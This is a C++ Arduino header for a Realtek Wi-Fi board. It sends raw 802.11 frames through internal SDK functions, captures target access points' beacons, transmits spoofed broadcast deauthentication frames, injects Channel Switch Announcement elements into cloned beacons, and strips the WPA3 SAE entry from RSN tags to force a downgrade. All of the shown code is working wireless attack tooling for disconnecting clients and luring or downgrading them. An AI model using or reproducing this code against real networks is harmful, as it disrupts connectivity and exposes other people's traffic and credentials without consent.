#pragma once // quite useless tho
#include <Arduino.h>
#include "idk.h"

#undef min
#undef max
#undef rand

#include <vector>
#include <array>
#include <algorithm>

#include <WiFi.h>
#include "wifi_conf.h"

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t**)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe((void*)((uint8_t *)ptr + 0xAE0));
  if (frame_control == NULL) return;

  update_mgntframe_attrib(ptr, (uint8_t *)frame_control + 8);
  memset(*(void**)((uint8_t*)frame_control + 0x80), 0, 0x68);
  uint8_t *frame_data = (uint8_t *)*(uint32_t *)((uint8_t *)frame_control + 0x80) + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)((uint8_t*)frame_control + 0x14) = length;
  *(uint32_t *)((uint8_t*)frame_control + 0x18) = length;
  dump_mgntframe(ptr, frame_control);
}

using namespace std;
using Mac = array<uint8_t, 6>;

struct AP_Info {
  char ssid[33];
  Mac bssid;
  uint8_t channel = 0;
  vector<Mac> STAs;
  int rssitol = 0, rssi = 0; // unused

  uint8_t* beacon = NULL;
  uint beaconLen = 0;
  bool beaconFound = false;

  uint8_t* wpa2Beacon = NULL;
  uint wpa2BeaconLen = 0;
  bool isWPA3 = false; // it should be haveWPA3 but whatever

  uint8_t* CSABeacon = NULL;
  uint CSABeaconLen = 0;
};


vector<AP_Info> AP_Map;
vector<uint8_t> channels;
uint8_t channel_index = 0;

bool activeDeauthMode;

void sniffer(unsigned char *buf, unsigned int len, void* _) {
  ieee80211_frame_info_t *pkt = (ieee80211_frame_info_t*)buf;
  uint8_t fc = pkt->i_fc & 0xFC;

  if (fc != 0x80) return;

  uint8_t *bssid = pkt->i_addr3;

  for (auto &ap : AP_Map) {
    if (!ap.beaconFound && memcmp(ap.bssid.data(), bssid, 6) == 0) {
      ap.beacon = (uint8_t*)malloc(len);
      if (ap.beacon) {
        memcpy(ap.beacon, buf, len);
        ap.beaconLen = len;
        ap.beaconFound = true;
      }
      return;
    }
  }
}


void sendDeauth(Mac bssid) {
  uint8_t deauth_frame[] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, MAC2STR(bssid.data()), MAC2STR(bssid.data()), 0x00, 0x00, 0x02, 0x00};
  wifi_tx_raw_frame(deauth_frame, sizeof(deauth_frame));
}

void insertCSA(uint8_t *buf, unsigned int *len, int newChannel, uint8_t switchCount) {
	unsigned int pos = 36;
	int insertPos = -1;

	while (pos < *len) {
		uint8_t elementId = buf[pos];
		uint8_t elementLength = buf[pos + 1];

		if (elementId == 0x03) insertPos = pos + 2 + elementLength; // DS Parameter Set

		pos += 2 + elementLength;
	}

	if (insertPos == -1) insertPos = *len; // fallback

	uint8_t csaTag[] = {
		0x25, 0x03,
		0x01,
		newChannel,
		switchCount
	};

	size_t csaLen = sizeof(csaTag);
	memmove(buf + insertPos + csaLen, buf + insertPos, *len - insertPos);
	memcpy(buf + insertPos, csaTag, csaLen);
	*len += csaLen;
}

void sendCSA(uint8_t *buf, unsigned int *len, int channel, int switchCount) {
  uint8_t *csaBeacon = (uint8_t *)malloc(*len + 5);
  if (csaBeacon == NULL) {printf("Memory allocation failed\n");return;}

  unsigned int originalLen = *len;
  for (int i = switchCount; i >= 0; i--) {
    memcpy(csaBeacon, buf, originalLen);
    unsigned int csaLen = originalLen;
    insertCSA(csaBeacon, &csaLen, channel, i);
    wifi_tx_raw_frame(csaBeacon, csaLen);
    // printf("Sent CSA Beacon with switch count: %u, Switch to channel: %i\n", i, channel);
    delay(100);
  }
  free(csaBeacon);
}

void removeWPA3RSNTag(uint8_t *buf, unsigned int *len) {
  unsigned int taggedParamsEnd = 36;

  while (taggedParamsEnd + 15 < *len) {
    uint8_t elementId = buf[taggedParamsEnd];
    uint8_t elementLength = buf[taggedParamsEnd + 1];

    if (elementId == 0x30) {
      unsigned int rsnStart = taggedParamsEnd;
      unsigned int rsnEnd = taggedParamsEnd + elementLength + 2;

      uint16_t akmCount = buf[taggedParamsEnd + 14];
      uint16_t akmPos = taggedParamsEnd + 16;

      for (int i = 0; i < akmCount; i++) {
        if (buf[akmPos] == 0x00 && buf[akmPos + 1] == 0x0F && buf[akmPos + 2] == 0xAC && buf[akmPos + 3] == 0x08) {
          memmove(buf + akmPos, buf + akmPos + 4, *len - (akmPos + 4));
          *len -= 4;
          elementLength -= 4;
          buf[taggedParamsEnd + 1] = elementLength;

          akmCount--;
          buf[taggedParamsEnd + 14] = akmCount;

        } else akmPos += 4;
      }

      if (akmCount == 0) {
        memmove(buf + rsnStart, buf + rsnEnd, *len - rsnEnd);
        *len -= (rsnEnd - rsnStart);
      }
    }
    taggedParamsEnd += 2 + elementLength;
  }
}



